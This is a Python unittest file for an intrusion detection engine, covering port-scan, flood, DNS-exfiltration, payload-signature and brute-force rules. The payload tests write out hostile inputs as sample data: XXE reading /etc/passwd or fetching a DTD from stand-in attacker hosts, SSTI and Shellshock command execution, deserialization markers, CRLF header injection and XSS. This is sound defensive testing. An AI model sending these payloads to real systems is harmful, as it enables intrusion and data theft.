"""
tests/test_new_rules_cycle8.py
--------------------------------
Regression and unit tests for Cycle 8 engine improvements:

  1. TestSeverityScaling       -- PortScanRule severity scales with scan breadth
  2. TestRstFloodDetection     -- SynFloodRule detects RST floods + still detects SYN floods
  3. TestDnsSubdomainExfil     -- DnsRule detects subdomain-based DNS exfiltration
  4. TestNewPayloadSignatures  -- PayloadRule detects XXE, SSTI, Shellshock, Deserialization,
                                  Header Injection
  5. TestBruteForceRule        -- BruteForceRule auth-port brute-force detection
  6. TestSlowPortScanRule      -- SlowPortScanRule low-and-slow scan detection
"""

import os
import sys
import time
import threading
import unittest

PROJECT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if PROJECT_DIR not in sys.path:
    sys.path.insert(0, PROJECT_DIR)

from engine.rules import (
    PortScanRule, SynFloodRule, DnsRule, PayloadRule,
    BruteForceRule, SlowPortScanRule,
    _BRUTE_FORCE_AUTH_PORTS,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _ip_record(src="10.0.0.1", dst="10.0.0.2", protocol="TCP",
               src_port=54321, dst_port=80, timestamp=None,
               initial_syn=True, tcp_flags=0x02, **kwargs):
    r = {
        "type": "IP",
        "src_ip": src,
        "dst_ip": dst,
        "protocol": protocol,
        "src_port": src_port,
        "dst_port": dst_port,
        "timestamp": timestamp or time.time(),
        "initial_syn": initial_syn,
        "tcp_flags": tcp_flags,
        "syn_flag": bool(tcp_flags & 0x02),
    }
    r.update(kwargs)
    return r


def _dns_record(src="10.0.0.5", dst="8.8.8.8", domain="example.com", timestamp=None):
    return {
        "type": "IP",
        "src_ip": src,
        "dst_ip": dst,
        "protocol": "UDP",
        "src_port": 12345,
        "dst_port": 53,
        "dns_query": domain,
        "timestamp": timestamp or time.time(),
    }


def _payload_record(payload: bytes, src="10.0.0.9", dst="10.0.0.1",
                    dst_port=80, src_port=54000, timestamp=None):
    return {
        "type": "IP",
        "src_ip": src,
        "dst_ip": dst,
        "protocol": "TCP",
        "src_port": src_port,
        "dst_port": dst_port,
        "payload": payload,
        "timestamp": timestamp or time.time(),
        "initial_syn": False,
        "tcp_flags": 0x18,
    }


# =============================================================================
# 1. PortScanRule Severity Scaling
# =============================================================================

class TestSeverityScaling(unittest.TestCase):

    def _fire_vertical(self, rule, src, dst, n, base):
        alert = None
        for i in range(n):
            r = _ip_record(src=src, dst=dst, dst_port=1000 + i,
                           timestamp=base + i * 0.01)
            alert = rule.check(r)
            if alert:
                break
        return alert

    def test_medium_severity_at_threshold(self):
        rule = PortScanRule(threshold=10, window=60)
        alert = self._fire_vertical(rule, "10.1.1.1", "10.1.1.2", 10, time.time())
        self.assertIsNotNone(alert)
        self.assertEqual(alert["severity"], "medium")
        self.assertEqual(alert["evidence"]["distinct_ports"], 10)

    def test_high_severity_at_double_threshold(self):
        """2× threshold ports → at least one alert is severity='high'."""
        rule = PortScanRule(threshold=10, window=60)
        rule._alert_cooldown = 0  # disable cooldown so both firings are visible
        base = time.time()
        alerts = []
        for i in range(20):
            r = _ip_record(src="10.1.1.3", dst="10.1.1.4", dst_port=1000 + i,
                           timestamp=base + i * 0.01)
            a = rule.check(r)
            if a:
                alerts.append(a)
        high_alerts = [a for a in alerts if a["severity"] == "high"]
        self.assertTrue(len(high_alerts) > 0, "At least one high-severity alert should fire at 2× threshold")
        self.assertEqual(high_alerts[-1]["evidence"]["distinct_ports"], 20)

    def test_horizontal_medium_at_threshold(self):
        rule = PortScanRule(threshold=10, window=60)
        base = time.time()
        alert = None
        for i in range(10):
            r = _ip_record(src="10.2.0.1", dst=f"10.2.0.{i+2}", dst_port=22,
                           timestamp=base + i * 0.01)
            alert = rule.check(r)
            if alert:
                break
        self.assertIsNotNone(alert)
        self.assertEqual(alert["severity"], "medium")

    def test_horizontal_high_at_double_threshold(self):
        """Horizontal scan: 2× threshold hosts → at least one alert is severity='high'."""
        rule = PortScanRule(threshold=10, window=60)
        rule._alert_cooldown = 0  # disable cooldown
        base = time.time()
        alerts = []
        for i in range(20):
            r = _ip_record(src="10.3.0.1", dst=f"10.3.0.{i+2}", dst_port=22,
                           timestamp=base + i * 0.01)
            a = rule.check(r)
            if a:
                alerts.append(a)
        high_alerts = [a for a in alerts if a["severity"] == "high"]
        self.assertTrue(len(high_alerts) > 0, "At least one high-severity alert should fire at 2× threshold")


# =============================================================================
# 2. SynFloodRule RST Flood Detection
# =============================================================================

class TestRstFloodDetection(unittest.TestCase):

    def _rst(self, src, dst, dst_port=None, timestamp=None):
        return {
            "type": "IP",
            "src_ip": src,
            "dst_ip": dst,
            "protocol": "TCP",
            "src_port": 54000,
            "dst_port": dst_port,
            "timestamp": timestamp or time.time(),
            "initial_syn": False,
            "tcp_flags": 0x04,  # RST only
            "syn_flag": False,
        }

    def test_invalid_rst_settings_use_defaults_and_do_not_turn_one_rst_into_a_flood(self):
        rule = SynFloodRule(
            threshold=100, max_flows=0, rst_threshold=0, rst_window="invalid",
            max_rst_flows="invalid", rst_response_grace=float("nan"),
            max_syn_contexts=0,
        )
        self.assertEqual(rule.max_flows, 8192)
        self.assertEqual(rule.rst_threshold, 100)
        self.assertEqual(rule.rst_window, 10)
        self.assertEqual(rule.max_rst_flows, 4096)
        self.assertEqual(rule.rst_response_grace, 5.0)
        self.assertEqual(rule.max_syn_contexts, 32768)
        self.assertIsNone(rule.check(self._rst(
            "192.0.2.31", "198.51.100.31", timestamp=100.0)))

    def test_valid_rst_threshold_one_and_zero_grace_remain_supported(self):
        rule = SynFloodRule(threshold=1000, rst_threshold=1,
                            rst_window=5, rst_response_grace=0)
        self.assertEqual(rule.rst_threshold, 1)
        self.assertEqual(rule.rst_response_grace, 0.0)
        alert = rule.check(self._rst(
            "192.0.2.32", "198.51.100.32", timestamp=100.0))
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["flood_type"], "RST")

    def test_rst_flood_fires_at_threshold(self):
        rule = SynFloodRule(rst_threshold=10, rst_window=5)
        base = time.time()
        alert = None
        for i in range(10):
            r = self._rst("192.168.1.10", "192.168.1.20", timestamp=base + i * 0.01)
            alert = rule.check(r)
            if alert:
                break
        self.assertIsNotNone(alert)
        self.assertEqual(alert["rule_name"], "SYN_FLOOD")
        self.assertEqual(alert["evidence"]["flood_type"], "RST")

    def test_rst_below_threshold_no_alert(self):
        rule = SynFloodRule(rst_threshold=100, rst_window=10)
        base = time.time()
        for i in range(50):
            r = self._rst("192.168.1.11", "192.168.1.21", timestamp=base + i * 0.1)
            self.assertIsNone(rule.check(r))

    def test_syn_flood_alerts_are_cooled_down_during_sustained_burst(self):
        rule = SynFloodRule(threshold=3, window=5, rst_threshold=1000)
        rule.ALERT_COOLDOWN_S = 3.0

        def syn(ts):
            return _ip_record(
                src="198.51.100.60", dst="203.0.113.60", src_port=50000,
                dst_port=80, timestamp=ts, initial_syn=True, tcp_flags=0x02)

        first = [rule.check(syn(100 + i * 0.1)) for i in range(3)]
        self.assertEqual(sum(alert is not None for alert in first), 1)
        sustained = [rule.check(syn(100.4 + i * 0.05)) for i in range(30)]
        self.assertFalse(any(alert is not None for alert in sustained))
        self.assertLessEqual(len(rule._syn_cooldown), rule.max_flows)
        later = [rule.check(syn(110 + i * 0.1)) for i in range(3)]
        self.assertEqual(sum(alert is not None for alert in later), 1)

    def test_rst_flood_alerts_are_cooled_down_during_sustained_burst(self):
        rule = SynFloodRule(threshold=1000, rst_threshold=3, rst_window=5)
        rule.ALERT_COOLDOWN_S = 3.0

        def rst(ts, seq):
            record = self._rst("198.51.100.61", "203.0.113.61", 443, ts)
            record.update(src_port=50000, tcp_seq=seq, tcp_ack=1)
            return record

        first = [rule.check(rst(100 + i * 0.1, i)) for i in range(3)]
        self.assertEqual(sum(alert is not None for alert in first), 1)
        sustained = [rule.check(rst(100.4 + i * 0.05, 3 + i)) for i in range(30)]
        self.assertFalse(any(alert is not None for alert in sustained))
        self.assertLessEqual(len(rule._rst_cooldown), rule.max_rst_flows)
        later = [rule.check(rst(110 + i * 0.1, 33 + i)) for i in range(3)]
        self.assertEqual(sum(alert is not None for alert in later), 1)

    def test_identical_rst_retransmissions_count_once_but_distinct_segments_count(self):
        rule = SynFloodRule(rst_threshold=10, rst_window=5)
        base = time.time()
        duplicate = self._rst("192.168.1.12", "192.168.1.22", timestamp=base)
        duplicate.update(src_port=49428, dst_port=443, tcp_seq=2686, tcp_ack=980515059)
        self.assertIsNone(rule.check(duplicate))
        for i in range(20):
            repeated = dict(duplicate, timestamp=base + (i + 1) * 0.01)
            self.assertIsNone(rule.check(repeated))
        alert = None
        for i in range(9):
            distinct = dict(duplicate, timestamp=base + 0.3 + i * 0.01,
                            tcp_seq=2687 + i)
            alert = rule.check(distinct)
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["flood_type"], "RST")

    def test_malformed_rst_sequence_metadata_skips_dedup_but_still_counts(self):
        for field, value in (("tcp_seq", "bad-sequence"), ("tcp_ack", float("nan"))):
            with self.subTest(field=field):
                rule = SynFloodRule(threshold=1000, rst_threshold=1)
                record = self._rst(
                    "192.0.2.40", "198.51.100.40", 443, timestamp=100.0)
                record[field] = value
                alert = rule.check(record)
                self.assertIsNotNone(alert)
                self.assertEqual(alert["evidence"]["rst_count"], 1)
                self.assertEqual(rule._rst_seen, {})

    def test_malformed_syn_and_rst_timestamps_do_not_corrupt_rate_windows(self):
        for invalid_time in ("bad-time", float("nan"), float("inf")):
            with self.subTest(kind="SYN", timestamp=invalid_time):
                rule = SynFloodRule(threshold=3, rst_threshold=3, window=10, rst_window=10)
                def syn(ts, port):
                    return _ip_record(
                        src="192.0.2.70", dst="198.51.100.70", src_port=50000,
                        dst_port=port, timestamp=ts, initial_syn=True, tcp_flags=0x02)
                self.assertIsNone(rule.check(syn(100.0, 80)))
                self.assertIsNone(rule.check(syn(101.0, 80)))
                self.assertIsNone(rule.check(syn(invalid_time, 80)))
                alert = rule.check(syn(102.0, 80))
                self.assertIsNotNone(alert)
                self.assertEqual(alert["rule_version"], "1.13")

            with self.subTest(kind="RST", timestamp=invalid_time):
                rule = SynFloodRule(threshold=1000, rst_threshold=3,
                                    window=10, rst_window=10)
                def rst(ts, seq):
                    record = self._rst(
                        "192.0.2.71", "198.51.100.71", 443, timestamp=ts)
                    record.update(tcp_seq=seq, tcp_ack=1)
                    return record
                self.assertIsNone(rule.check(rst(100.0, 1)))
                self.assertIsNone(rule.check(rst(101.0, 2)))
                self.assertIsNone(rule.check(rst(invalid_time, 3)))
                alert = rule.check(rst(102.0, 4))
                self.assertIsNotNone(alert)
                self.assertEqual(alert["rule_version"], "1.13")

    def test_closed_port_scan_rst_replies_do_not_count_as_rst_flood(self):
        rule = SynFloodRule(threshold=1000, rst_threshold=10, rst_window=5,
                            rst_response_grace=2)
        base = time.time()
        syn = _ip_record(src="10.0.0.1", dst="10.0.0.2", src_port=54000,
                         dst_port=22, timestamp=base, initial_syn=True,
                         tcp_flags=0x02)
        self.assertIsNone(rule.check(syn))

        # A closed-port target replies immediately with RST|ACK in the
        # opposite direction. This is normal scan feedback, not a reset flood.
        for i in range(10):
            rst = self._rst("10.0.0.2", "10.0.0.1", dst_port=54000,
                            timestamp=base + 0.1 + i * 0.05)
            rst.update(src_port=22, tcp_flags=0x14)
            self.assertIsNone(rule.check(rst))
        self.assertEqual(rule._rst_history, {})

    def test_reverse_rst_after_syn_ack_still_counts(self):
        rule = SynFloodRule(threshold=1000, rst_threshold=1, rst_window=5,
                            rst_response_grace=2)
        base = time.time()
        self.assertIsNone(rule.check(_ip_record(
            src="10.0.0.1", dst="10.0.0.2", src_port=54000, dst_port=80,
            timestamp=base, initial_syn=True, tcp_flags=0x02,
        )))
        self.assertIsNone(rule.check(_ip_record(
            src="10.0.0.2", dst="10.0.0.1", src_port=80, dst_port=54000,
            timestamp=base + 0.05, initial_syn=False, tcp_flags=0x12,
        )))
        rst = self._rst("10.0.0.2", "10.0.0.1", dst_port=54000,
                        timestamp=base + 0.1)
        rst.update(src_port=80, tcp_flags=0x14)
        alert = rule.check(rst)
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["flood_type"], "RST")

    def test_syn_flood_still_fires(self):
        rule = SynFloodRule(threshold=10, window=10, rst_threshold=1000)
        base = time.time()
        alert = None
        for i in range(10):
            r = _ip_record(src="10.0.0.1", dst="10.0.0.2", dst_port=80,
                           initial_syn=True, tcp_flags=0x02, timestamp=base + i * 0.05)
            alert = rule.check(r)
            if alert:
                break
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["flood_type"], "SYN")

    def test_rst_flood_prune_stale_works(self):
        rule = SynFloodRule(rst_threshold=100, rst_window=5)
        base = time.time()
        for i in range(50):
            rule.check(self._rst("10.7.7.7", "10.7.7.8", timestamp=base + i * 0.01))
        rule.prune_stale(base + 1000)
        with rule._lock:
            self.assertEqual(len(rule._rst_history), 0)
            self.assertEqual(len(rule._rst_cooldown), 0)

    def test_distinct_destinations_tracked_separately(self):
        rule = SynFloodRule(rst_threshold=10, rst_window=5)
        base = time.time()
        alerts = []
        for i in range(10):
            a1 = rule.check(self._rst("10.0.1.1", "10.0.1.2", timestamp=base + i * 0.01))
            a2 = rule.check(self._rst("10.0.1.1", "10.0.1.3", timestamp=base + i * 0.01))
            if a1: alerts.append(a1)
            if a2: alerts.append(a2)
        self.assertEqual(len(alerts), 2)
        dsts = {a["dst_ip"] for a in alerts}
        self.assertIn("10.0.1.2", dsts)
        self.assertIn("10.0.1.3", dsts)


# =============================================================================
# 3. DnsRule Subdomain Exfiltration Detection
# =============================================================================

class TestDnsSubdomainExfil(unittest.TestCase):

    def test_short_label_gTLD_is_grouped_by_registered_domain(self):
        rule = DnsRule(subdomain_threshold=3, subdomain_window=60,
                       freq_threshold=0, entropy_threshold=10.0)
        base = time.time()
        alert = None
        for i, label in enumerate(("a", "b", "c")):
            alert = rule.check(_dns_record(
                src="10.0.0.26", domain=f"{label}.bad.com",
                timestamp=base + i * 0.1))
        self.assertIsNotNone(alert)
        self.assertEqual(alert["rule_version"], "1.23")
        self.assertEqual(alert["evidence"]["sub_type"], "DNS_EXFIL")
        self.assertEqual(alert["evidence"]["parent_domain"], "bad.com")
        self.assertEqual(alert["evidence"]["distinct_subdomains"], 3)

    def test_two_letter_country_code_suffix_grouping_remains_supported(self):
        rule = DnsRule(subdomain_threshold=3, freq_threshold=0,
                       entropy_threshold=10.0)
        base = time.time()
        alert = None
        for i, label in enumerate(("a", "b", "c")):
            alert = rule.check(_dns_record(
                src="10.0.0.27", domain=f"{label}.example.co.uk",
                timestamp=base + i * 0.1))
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["parent_domain"], "example.co.uk")
        self.assertEqual(alert["evidence"]["distinct_subdomains"], 3)

    def test_unknown_short_suffix_is_not_guessed_as_a_public_suffix(self):
        rule = DnsRule(subdomain_threshold=3, subdomain_window=60,
                       freq_threshold=0, entropy_threshold=10.0)
        base = time.time()
        alert = None
        for i, label in enumerate(("a", "b", "c")):
            alert = rule.check(_dns_record(
                src="10.0.0.28", domain=f"{label}.foo.io",
                timestamp=base + i * 0.1))
        self.assertIsNotNone(alert)
        self.assertEqual(alert["rule_version"], "1.23")
        self.assertEqual(alert["evidence"]["parent_domain"], "foo.io")
        self.assertEqual(alert["evidence"]["distinct_subdomains"], 3)

        unrelated = DnsRule(subdomain_threshold=3, freq_threshold=0,
                            entropy_threshold=10.0)
        for i, domain in enumerate(("foo.io", "bar.io", "baz.io")):
            self.assertIsNone(unrelated.check(_dns_record(
                src="10.0.0.29", domain=f"a.{domain}",
                timestamp=base + i * 0.1)))
        self.assertEqual(unrelated._parent_domain("a.example.com.au"), "example.com.au")

    def test_many_distinct_subdomains_trigger_exfil(self):
        rule = DnsRule(subdomain_threshold=10, subdomain_window=60,
                       freq_threshold=0, entropy_threshold=10.0)
        base = time.time()
        alert = None
        for i in range(10):
            r = _dns_record(src="10.0.0.20",
                            domain=f"chunk{i:04x}{'a'*10}.evil.com",
                            timestamp=base + i * 0.1)
            alert = rule.check(r)
            if alert:
                break
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["sub_type"], "DNS_EXFIL")
        self.assertEqual(alert["severity"], "high")
        self.assertGreaterEqual(alert["evidence"]["distinct_subdomains"], 10)

    def test_distinct_nested_subdomains_under_stable_prefix_trigger_exfil(self):
        rule = DnsRule(subdomain_threshold=5, subdomain_window=60,
                       freq_threshold=0, entropy_threshold=10.0,
                       max_query_len=100)
        base = time.time()
        alert = None
        for i in range(5):
            alert = rule.check(_dns_record(
                src="10.0.0.23",
                domain=f"host.chunk{i:04x}.evil.com",
                timestamp=base + i * 0.1))
        self.assertIsNotNone(alert)
        self.assertEqual(alert["rule_version"], "1.23")
        self.assertEqual(alert["evidence"]["sub_type"], "DNS_EXFIL")
        self.assertEqual(alert["evidence"]["subdomain"], "host.chunk0004")
        self.assertEqual(alert["evidence"]["distinct_subdomains"], 5)

    def test_exfil_takes_precedence_over_freq_when_freq_enabled(self):
        """When both frequency and subdomain thresholds are reached, exfil takes priority."""
        rule = DnsRule(subdomain_threshold=5, subdomain_window=60,
                       freq_threshold=5, freq_window=60, entropy_threshold=10.0)
        base = time.time()
        alert = None
        for i in range(5):
            r = _dns_record(src="10.0.0.20",
                            domain=f"data{i}.exfil.com",
                            timestamp=base + i * 0.1)
            alert = rule.check(r)
            if alert:
                break
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["sub_type"], "DNS_EXFIL")
        self.assertEqual(alert["severity"], "high")

    def test_same_subdomain_repeated_not_triggered(self):
        rule = DnsRule(subdomain_threshold=5, subdomain_window=60,
                       freq_threshold=0, entropy_threshold=10.0)
        base = time.time()
        for i in range(20):
            r = _dns_record(src="10.0.0.21", domain="www.safe.com",
                            timestamp=base + i * 0.1)
            self.assertIsNone(rule.check(r))

    def test_threshold_zero_disables_exfil(self):
        rule = DnsRule(subdomain_threshold=0, subdomain_window=60,
                       freq_threshold=0, entropy_threshold=10.0)
        base = time.time()
        for i in range(50):
            r = _dns_record(src="10.0.0.22",
                            domain=f"chunk{i:08x}.evil.com",
                            timestamp=base + i * 0.1)
            self.assertIsNone(rule.check(r))

    def test_prune_stale_clears_subdomain_state(self):
        rule = DnsRule(subdomain_threshold=100, subdomain_window=5,
                       freq_threshold=0, entropy_threshold=10.0)
        base = time.time()
        for i in range(10):
            rule.check(_dns_record(src="10.0.0.23",
                                   domain=f"sub{i}.example.com",
                                   timestamp=base + i * 0.1))
        rule.prune_stale(base + 1000)
        with rule._lock:
            self.assertEqual(len(rule._subdomain_freq), 0)

    def test_exfil_fires_independently_per_parent(self):
        rule = DnsRule(subdomain_threshold=3, subdomain_window=60,
                       freq_threshold=0, entropy_threshold=10.0)
        base = time.time()
        alerts = []
        for parent in ("evil.com", "attacker.net"):
            for i in range(3):
                r = _dns_record(src="10.0.0.25",
                                domain=f"enc{i}.{parent}",
                                timestamp=base + i * 0.1)
                a = rule.check(r)
                if a and a["evidence"]["sub_type"] == "DNS_EXFIL":
                    alerts.append(a)
            base += 10
        self.assertEqual(len(alerts), 2)
        parents = {a["evidence"]["parent_domain"] for a in alerts}
        self.assertIn("evil.com", parents)
        self.assertIn("attacker.net", parents)


# =============================================================================
# 4. New PayloadRule Signatures
# =============================================================================

class TestNewPayloadSignatures(unittest.TestCase):

    def _check(self, payload: bytes, dst_port: int = 80):
        rule = PayloadRule(max_bytes=2048, enabled=True)
        return rule.check(_payload_record(payload, dst_port=dst_port))

    def _sigs(self, alert):
        return [h["signature"] for h in alert["evidence"]["hits"]]

    def test_xxe_entity_system_fires(self):
        payload = b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        alert = self._check(payload)
        self.assertIsNotNone(alert)
        self.assertIn("XXE", self._sigs(alert))
        self.assertEqual(alert["severity"], "high")

    def test_xxe_doctype_system_fires(self):
        payload = b'<!DOCTYPE root SYSTEM "http://evil.com/evil.dtd">'
        alert = self._check(payload)
        self.assertIsNotNone(alert)
        self.assertIn("XXE", self._sigs(alert))

    def test_ssti_jinja2_fires(self):
        payload = b"name={{ 7*7 }}"
        alert = self._check(payload)
        self.assertIsNotNone(alert)
        self.assertIn("SSTI", self._sigs(alert))

    def test_ssti_dollar_brace_fires(self):
        payload = b"name=${Runtime.exec('id')}"
        alert = self._check(payload)
        self.assertIsNotNone(alert)
        self.assertIn("SSTI", self._sigs(alert))

    def test_shellshock_fires(self):
        payload = b"GET / HTTP/1.1\r\nUser-Agent: () { :;}; /bin/bash -c 'echo vulnerable'\r\n"
        alert = self._check(payload)
        self.assertIsNotNone(alert)
        self.assertIn("SHELLSHOCK", self._sigs(alert))
        self.assertEqual(alert["severity"], "high")

    def test_java_deserialization_magic_fires(self):
        payload = b'\xac\xed\x00\x05sr\x00\x17java.lang.Runtime'
        alert = self._check(payload, dst_port=8080)
        self.assertIsNotNone(alert)
        self.assertIn("DESERIALIZATION", self._sigs(alert))
        self.assertEqual(alert["severity"], "high")

    def test_python_pickle_marker_fires(self):
        payload = b'POST /api HTTP/1.1\r\n\r\npickle.loads(data)'
        alert = self._check(payload)
        self.assertIsNotNone(alert)
        self.assertIn("DESERIALIZATION", self._sigs(alert))

    def test_header_injection_urlencoded_crlf(self):
        payload = b'GET /?x=foo%0d%0aSet-Cookie:%20admin=1 HTTP/1.1\r\n'
        alert = self._check(payload)
        self.assertIsNotNone(alert)
        self.assertIn("HEADER_INJECTION", self._sigs(alert))

    def test_raw_crlf_header_injection(self):
        payload = b'GET /?next=value\r\nSet-Cookie: admin=1 HTTP/1.1\r\n'
        alert = self._check(payload)
        self.assertIsNotNone(alert)
        self.assertIn("HEADER_INJECTION", self._sigs(alert))

    def test_xss_document_cookie_fires(self):
        payload = b"<script>document.cookie</script>"
        alert = self._check(payload)
        self.assertIsNotNone(alert)
        self.assertIn("XSS", self._sigs(alert))

    def test_multi_signature_one_payload(self):
        """A payload with XXE + SSTI should produce both signatures."""
        # Use pure SSTI payload without /etc/passwd to avoid PATH_TRAVERSAL conflict
        payload = (
            b'<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">'
            b'<name>{{ 7*7 }}</name>'
        )
        alert = self._check(payload)
        self.assertIsNotNone(alert)
        sigs = set(self._sigs(alert))
        self.assertTrue(sigs.issuperset({"XXE", "SSTI"}), f"Got {sigs}")


# =============================================================================
# 5. BruteForceRule
# =============================================================================

class TestBruteForceRule(unittest.TestCase):

    def _syn(self, src, dst, dst_port=22, timestamp=None):
        return _ip_record(src=src, dst=dst, dst_port=dst_port,
                          initial_syn=True, tcp_flags=0x02,
                          timestamp=timestamp or time.time())

    def test_invalid_settings_use_defaults_and_ignore_bad_extra_ports(self):
        rule = BruteForceRule(
            threshold=0, window=0, max_states="invalid",
            extra_ports=(2222, "bad", 70000),
        )
        self.assertEqual(rule.threshold, 20)
        self.assertEqual(rule.window, 60)
        self.assertEqual(rule.max_states, 8192)
        self.assertIn(2222, rule.auth_ports)
        self.assertNotIn(70000, rule.auth_ports)
        for i in range(2):
            self.assertIsNone(rule.check(self._syn(
                "198.51.100.90", "203.0.113.90", dst_port=22,
                timestamp=100 + i)))

    def test_fires_at_threshold_on_auth_port(self):
        rule = BruteForceRule(threshold=5, window=60)
        base = time.time()
        alert = None
        for i in range(5):
            r = self._syn("10.0.0.1", "10.0.0.2", dst_port=22,
                          timestamp=base + i * 0.5)
            alert = rule.check(r)
            if alert:
                break
        self.assertIsNotNone(alert)
        self.assertEqual(alert["rule_name"], "BRUTE_FORCE")
        self.assertEqual(alert["rule_version"], "1.12")
        self.assertEqual(alert["severity"], "medium")
        self.assertEqual(alert["confidence"], "heuristic")
        self.assertEqual(alert["evidence"]["classification"], "AUTH_SERVICE_SYN_BURST")
        self.assertIn("authentication outcome is not observed", alert["detail"])
        self.assertEqual(alert["evidence"]["auth_port"], 22)

    def test_syn_ack_is_not_counted_when_initial_syn_metadata_is_missing(self):
        rule = BruteForceRule(threshold=2, window=60)
        for i in range(3):
            record = self._syn("203.0.113.80", "203.0.113.44", dst_port=22,
                               timestamp=100 + i)
            record.pop("initial_syn")
            record.update(src_port=22, syn_flag=True, tcp_flags=0x12)
            self.assertIsNone(rule.check(record))
        self.assertEqual(rule._history, {})

    def test_common_source_port_does_not_hide_authentication_syn_attempts(self):
        rule = BruteForceRule(threshold=2, window=60)
        first = self._syn("203.0.113.44", "203.0.113.80", dst_port=22,
                          timestamp=100.0)
        first["src_port"] = 80
        self.assertIsNone(rule.check(first))
        second = dict(first, timestamp=100.1, tcp_seq=200)
        first["tcp_seq"] = 100
        alert = rule.check(second)
        self.assertIsNotNone(alert)
        self.assertEqual(alert["rule_version"], "1.12")
        self.assertEqual(alert["evidence"]["attempt_count"], 2)

    def test_syn_ack_from_auth_service_port_is_not_counted(self):
        rule = BruteForceRule(threshold=2, window=60)
        for i in range(3):
            record = self._syn("203.0.113.80", "203.0.113.44", dst_port=22,
                               timestamp=100 + i)
            record.update(src_port=22, initial_syn=False, syn_flag=True,
                          tcp_flags=0x12)
            self.assertIsNone(rule.check(record))
        self.assertEqual(rule._history, {})

    def test_retransmitted_syn_is_not_counted_as_a_second_login_attempt(self):
        rule = BruteForceRule(threshold=2, window=60)
        base = time.time()
        first = self._syn("10.0.0.11", "10.0.0.12", dst_port=22,
                          timestamp=base)
        first.update(src_port=50000, tcp_seq=100)
        self.assertIsNone(rule.check(first))

        retransmission = dict(first, timestamp=base + 1)
        self.assertIsNone(rule.check(retransmission))

        # Same tuple with a new initial sequence is a distinct connection.
        new_attempt = dict(first, timestamp=base + 2, tcp_seq=200)
        alert = rule.check(new_attempt)
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["attempt_count"], 2)

    def test_syn_retransmission_cache_is_bounded(self):
        rule = BruteForceRule(threshold=100, window=60, max_states=1)
        rule._max_seen_syns = 2
        base = time.time()
        for i in range(3):
            record = self._syn(f"10.0.0.{20 + i}", "10.0.0.12",
                               timestamp=base + i)
            record.update(src_port=51000 + i, tcp_seq=100 + i)
            self.assertIsNone(rule.check(record))
        self.assertEqual(len(rule._seen_syns), 2)

    def test_non_auth_port_does_not_fire(self):
        rule = BruteForceRule(threshold=5, window=60)
        base = time.time()
        for i in range(20):
            r = self._syn("10.0.0.3", "10.0.0.4", dst_port=80,
                          timestamp=base + i * 0.1)
            self.assertIsNone(rule.check(r))

    def test_generic_web_admin_port_is_not_assumed_to_be_authentication(self):
        rule = BruteForceRule(threshold=5, window=60)
        base = time.time()
        for port in (8080, 8443):
            for i in range(20):
                self.assertIsNone(rule.check(self._syn(
                    "10.0.0.3", "10.0.0.4", dst_port=port,
                    timestamp=base + i * 0.1)))

    def test_custom_auth_port_can_be_enabled_explicitly(self):
        rule = BruteForceRule(threshold=3, window=60, extra_ports=(8443,))
        base = time.time()
        alert = None
        for i in range(3):
            alert = rule.check(self._syn(
                "10.0.0.3", "10.0.0.4", dst_port=8443,
                timestamp=base + i * 0.1))
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["auth_port"], 8443)

    def test_mssql_and_ldaps_auth_ports_detected(self):
        for port in (1433, 1521, 5985, 5986, 636, 993, 995):
            with self.subTest(port=port):
                rule = BruteForceRule(threshold=3, window=60)
                base = time.time()
                alert = None
                for i in range(3):
                    alert = rule.check(self._syn(
                        "10.0.0.10", "10.0.0.20", dst_port=port,
                        timestamp=base + i * 0.1))
                self.assertIsNotNone(alert)
                self.assertEqual(alert["rule_version"], "1.12")
                self.assertEqual(alert["evidence"]["auth_port"], port)

    def test_below_threshold_no_alert(self):
        rule = BruteForceRule(threshold=10, window=60)
        base = time.time()
        for i in range(9):
            r = self._syn("10.0.0.5", "10.0.0.6", dst_port=22,
                          timestamp=base + i * 0.1)
            self.assertIsNone(rule.check(r))

    def test_cooldown_suppresses_repeat_alert(self):
        rule = BruteForceRule(threshold=5, window=60)
        rule.ALERT_COOLDOWN_S = 300
        base = time.time()
        first = None
        for i in range(5):
            a = rule.check(self._syn("10.0.0.8", "10.0.0.9", dst_port=22,
                                     timestamp=base + i * 0.1))
            if a:
                first = a
                break
        self.assertIsNotNone(first)
        for i in range(5):
            a = rule.check(self._syn("10.0.0.8", "10.0.0.9", dst_port=22,
                                     timestamp=base + 1.0 + i * 0.1))
            self.assertIsNone(a)

    def test_cooldown_history_is_threshold_bounded_and_recovers(self):
        rule = BruteForceRule(threshold=3, window=60)
        rule.ALERT_COOLDOWN_S = 5
        base = 100.0
        first_alert = None
        for i in range(3):
            first_alert = rule.check(self._syn(
                "10.0.0.18", "10.0.0.19", timestamp=base + i * 0.1))
        self.assertIsNotNone(first_alert)
        for i in range(1000):
            self.assertIsNone(rule.check(self._syn(
                "10.0.0.18", "10.0.0.19", timestamp=base + 1 + i * 0.001)))
        key = ("10.0.0.18", "10.0.0.19", 22)
        self.assertLessEqual(len(rule._history[key]), rule.threshold)
        later_alert = rule.check(self._syn(
            "10.0.0.18", "10.0.0.19", timestamp=base + 7))
        self.assertIsNotNone(later_alert)
        self.assertEqual(later_alert["evidence"]["attempt_count"], 3)
        self.assertTrue(later_alert["evidence"]["attempt_count_saturated"])

    def test_cooldown_map_stays_bounded_after_history_pruning(self):
        rule = BruteForceRule(threshold=2, window=1, max_states=5)
        for i in range(20):
            base = 100.0 + i * 2
            self.assertIsNone(rule.check(self._syn(
                f"10.1.{i}.1", "10.1.0.2", timestamp=base)))
            self.assertIsNotNone(rule.check(self._syn(
                f"10.1.{i}.1", "10.1.0.2", timestamp=base + 0.1)))
            rule.prune_stale(base + 1.5)
        self.assertLessEqual(len(rule._cooldown), rule.max_states)

    def test_different_auth_ports_tracked_independently(self):
